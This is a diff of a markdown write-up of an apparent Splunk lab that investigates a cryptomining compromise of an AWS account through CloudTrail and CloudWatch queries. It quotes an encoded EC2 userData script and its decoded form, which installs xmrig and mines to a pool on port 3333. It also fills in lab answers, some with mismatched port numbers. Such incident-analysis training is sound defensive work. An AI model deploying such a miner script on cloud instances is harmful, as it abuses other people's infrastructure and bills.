@@ -11,8 +11,6 @@ Alarming Indicators of Compromise Detected
 Let's get straight to the facts. The RabbitHole Labs AWS account is in trouble We've detected unusualand expensive resource provisioning, indicating a clear compromise. This isn't about data theft, butabout attackers leveraging the infrastructure to mine cryptocurrency, directly impacting the AWS bill and service availability.
 
 
-<img width="775" height="548" alt="image" src="https://github.com/user-attachments/assets/d40b16f4-3dee-4032-89ab-1ce35065d9e4" />
-
 
 ### AWS Cloudtrail
 - Effective detection hinges on understanding where to find the evidence. For these early attackphases, AWS CloudTrail is paramount. This service provides a complete record of API activity across your AWS accounts. Every action, whether performed through the AWS Management Console, AWS CLI, AWS SDKs, or other AWS services, is logged as an event.
@@ -27,6 +25,7 @@ Let's get straight to the facts. The RabbitHole Labs AWS account is in trouble W
 ### AWS CloudWatch
 CloudWatch Logs allows you to centralize logs from various sources, including operating systems and applications running on EC2 instances. While not directly for initial access, these logs become critical
 after an instance is launched.
+
 ```
 Why it's crucial: If an attacker launches an EC2 instance, the logs from within
 that instance (e.g., syslog, auth.log, application logs, or even specific logs from the
@@ -67,7 +66,10 @@ Let’s dive in and uncover the truth in the AWS CloudTrail and CloudWatch logs
 
 
 <img width="1658" height="493" alt="image" src="https://github.com/user-attachments/assets/30b6aa7c-eeb0-400e-b05b-e9b75a98a172" />
-```Locate and click the Start investigation button. You are re-directed to the investigation you just opened. 5. Note the investigation ID "ES-00001" Write it down for future reference.```
+
+```
+Locate and click the Start investigation button. You are re-directed to the investigation you just opened. 5. Note the investigation ID "ES-00001" Write it down for future reference.
+```
 
 <img width="1688" height="1214" alt="image" src="https://github.com/user-attachments/assets/90d0625a-403e-4a6e-8648-4355bb466ff3" />
 Assigning to myself ans changing the status to in progress 
@@ -79,7 +81,10 @@ This is the AWS IAM User, and IP address where the RunInstance request was issue
 
 
 Based on the eventNames in the drill-down search results, other activities this user identity been associated with include:
-```index=edu eventSource="ec2.amazonaws.com" eventName="RunInstances" userIdentity.userName="dev-automation" ```
+```
+index=edu eventSource="ec2.amazonaws.com" eventName="RunInstances" userIdentity.userName="dev-automation" 
+```
+
 <img width="1321" height="1105" alt="image" src="https://github.com/user-attachments/assets/d306e295-ac27-4a1d-b312-827efd10ee43" />
 
 
@@ -93,9 +98,11 @@ Based on the eventNames in the drill-down search results, other activities this 
 
 
 From Splunk ES, navigate to Analytics > Security Intelligence > Risk analysis
+
 <img width="1602" height="633" alt="image" src="https://github.com/user-attachments/assets/27705ec7-088d-426d-9f74-3b98037898f8" />
 
 Intermediate Findings 
+
 <img width="1486" height="646" alt="image" src="https://github.com/user-attachments/assets/9cbd76e9-fd79-44e1-b525-1e4d73ddc5c3" />
 
 
@@ -140,21 +147,80 @@ decode this field, let's add it to the "Additional fields" so it shows in this a
 6. Select the Save button.
 7. Return to your investigation, and confirm that the userData field is now visible in the Additional
 fields area.
+
 <img width="1655" height="845" alt="image" src="https://github.com/user-attachments/assets/a836b6e5-0b24-40d6-b9e4-b3a54d7bf58c" />
+
 ```
 IyEvYmluL2Jhc2ggXG4gYXB0IHVwZGF0ZSBhbmQgYXB0IGluc3RhbGwgXG4gY3VyZCB4bXJpZyB4bXJpZyAtYSB4bXJpZ3Bvb2wuY29tOjMzMzMgLXUgd2FsbGV0X2FkZHJlc3NfMjAyNTEwMjEud29ya2VyX25hbWU
+
+#!/bin/bash \n apt update and apt install \n curd xmrig xmrig -a xmrigpool.com:3333 -u wallet_address_20251021.worker_name
 ```
+
 8. Copy the value for userData and use a tool of your choice, or 
 Cyberchef to decode the data.
 What does the userData reveal?
+The userData revealed a script to ensure the new instances install xmrig and then start the program
+to send mined currency to a specific wallet. Let's confirm the installation of the software, then we will
+look at network traffic to determine if the mining was successful
 
 
+Use the following SPL to view cloudwatch logs including the cloud-init activities for the initial
+configuration of the instances:
+
+```
+index=edu sourcetype="aws:cloudwatch:metric" logGroup="/aws/ec2/instance/i0123456789abcdef*"
+```
+
+<img width="1388" height="658" alt="image" src="https://github.com/user-attachments/assets/98d04430-ae30-44cf-a8e0-e577d83e947f" />
+It looks like the software was installed successfully; time to check network traffic to determine is external connections were made. The userData script indicates use of port 3333
 
 
+```
+index=edu eventSource="ec2.amazonaws.com" "sg-0abcdef1234567890"
+| table eventTime eventName
+```
+
+<img width="1513" height="562" alt="image" src="https://github.com/user-attachments/assets/64404129-b7a4-4955-9697-730d88d03310" />
 
 
+To determine allowed ports and protocols 
+
+```
+index=edu eventSource="ec2.amazonaws.com" 
+eventName="AuthorizeSecurityGroupIngress" "sg-0abcdef1234567890"
+```
+
+<img width="785" height="966" alt="image" src="https://github.com/user-attachments/assets/77d4973a-eef3-4f4a-82cd-04379b69a6e4" />
+TCP 22,444,333
+
+1. How many permissions are set in the security group? 3 permission sets 
+2. What are the IP address(es) and protocol(s) are allowed through the Ingress security group, to communicate directly to the EC2 instance from the internet?  cidrIp: 0.0.0.0/0  any
+3. What port(s) are allowed through the Ingress security group for these protocol(s)? 22,4444,3333
+4. What are these ports typically used for? 22(SSH)
+
+Analyst Note
+- Compromised User: dev-automation
+- Attacker IP: 203.0.113.42 (Identified as the src the user launched instancesfrom)
+- Initial Actions: Reconnaissance (List/Describe calls), created miner-sg 20251021 (sg-0abcdef1234567890) with wide-open ports (22, 3333, 4444), created miner-key-20251021.
+- Malicious Resources: Launched 3 p3.2xlarge EC2 instances (i0123456789abcdef0, i-0123456789abcdef1, i-0123456789abcdef2) with userData (decoded by SOAR) indicating cryptocurrency mining software installation.
+- Analysis: Newly created instances had XMRig installed and were configured to send mined cryptocurrency to a specified wallet over port 3333 per the userData in the RunInstance event from AWS Cloudtrail logs
+
+You've determined that an attacker used the dev-automation IAM user to launch EC2 instances for
+cryptocurrency mining. While the incident response teams work to take actions to contain the incident
+(such as disabling the compromised AWS IAM User), let's complete your investigation by identifying
+any cleanup activities the attacker performed
 
 
+```
+index=edu eventSource="ec2.amazonaws.com" 
+eventName="AuthorizeSecurityGroupIngress" 
+"sg-0abcdef1234567890"
+| `add_events(ES-00001)`
+```
 
+<img width="1667" height="700" alt="image" src="https://github.com/user-attachments/assets/ea5264dc-fa4f-4404-9380-74ec5792406c" />
+
+Verificcation that the event shows in the investigation 
+<img width="1203" height="961" alt="image" src="https://github.com/user-attachments/assets/3b2436dc-8b1d-4abf-8675-85e525915436" />
 
 
